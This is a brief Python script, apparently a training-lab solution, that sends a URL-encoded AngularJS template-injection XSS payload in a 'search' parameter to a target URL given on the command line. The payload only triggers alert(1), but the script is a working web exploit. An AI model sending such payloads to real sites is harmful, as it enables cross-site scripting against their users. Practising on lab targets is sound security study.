import requests
import sys

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("Usage: python3 solution.py <url>")
        sys.exit(1)

burp_url = sys.argv[1] + '/?search=%7B%7B%24on.constructor%28%27alert%281%29%27%29%28%29%7D%7D'

burp_headers = {}
requests.get(burp_url, headers=burp_headers)
